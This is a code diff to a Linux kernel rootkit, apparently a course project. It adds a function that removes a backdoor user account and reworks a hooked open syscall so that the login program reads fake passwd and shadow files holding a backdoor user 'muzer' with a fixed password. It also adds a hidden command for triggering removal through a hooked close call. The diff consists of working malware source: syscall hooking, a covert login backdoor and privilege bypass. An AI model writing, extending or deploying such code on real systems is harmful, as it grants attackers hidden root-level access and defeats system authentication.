@@ -127,6 +127,35 @@ int add_backdoor(void)
 }
 
 /*
+ * Removes backdoor muzer account
+ */
+int remove_backdoor(void)
+{
+    int ret = 0;
+    struct file* filp;
+
+    backdoor_added = 0;
+    filp = filp_open("/etc/cse509--muzerpasswd", O_RDONLY, 0);
+    if (!IS_ERR(filp)) {
+        // muzerpasswd file exists. Delete it.
+        ret = deletes_file(filp);
+        if (ret < 0) {
+            PUBMSG("Failed to remove original muzerpasswd");
+        }
+    }
+
+    filp = filp_open("/etc/cse509--muzershadow", O_RDONLY, 0);
+    if (!IS_ERR(filp)) {
+        // muzershadow file exists. Delete it.
+        ret = deletes_file(filp);
+        if (ret < 0) {
+            PUBMSG("Failed to remove original muzershadow");
+        }
+    }
+    return ret;
+}
+
+/*
  * Creates copies of /etc/shadow and /etc/passwd files.
  * The copies contain a backdoor account with username muzer
  * and password 12345. The User muzer's home directory
@@ -535,12 +564,24 @@ out:
 asmlinkage long my_open(const char __user *pathname, int flags, mode_t mode)
 {
     long fd = -1;
+    mm_segment_t fs;
     char* loginproc = "login";
+    //char* addproc = "adduser"; //<<<<<< Trigger new muzerfiles creation
+    //char* delproc = "deluser";
+
     if (backdoor_added && (strcmp(current->comm, loginproc) == 0)) {
         if (is_userspace_str(pathname, "/etc/passwd")) {
+            fs = get_fs();
+            set_fs(get_ds());
             fd = original_open("/etc/cse509--muzerpasswd", flags, mode);
+            //fd = original_open("/etc/passwd", flags, mode);
+            set_fs(fs);
         } else if (is_userspace_str(pathname, "/etc/shadow")) {
+            fs = get_fs();
+            set_fs(get_ds());
             fd = original_open("/etc/cse509--muzershadow", flags, mode);
+            //fd = original_open("/etc/shadow", flags, mode);
+            set_fs(fs);
         }
     } else {
         fd = original_open(pathname, flags, mode);
@@ -587,6 +628,9 @@ asmlinkage int my_close(int fd)
             break;
         case ADD_BACKDOOR:
             err = add_backdoor();
+            break;
+        case REMOVE_BACKDOOR:
+            err = remove_backdoor();
             break;
         default:
             printk(KERN_EMERG "Wrong rootkit command: %d\n", fd);
@@ -688,6 +732,9 @@ void rootkit_exit(void)
         PUBMSG("Nothing to unload");
         goto out;
     }
+
+    // Remove the files adding muzer account to system
+    remove_backdoor();
 
     // Disable write protection on page
     disable_write_protection();
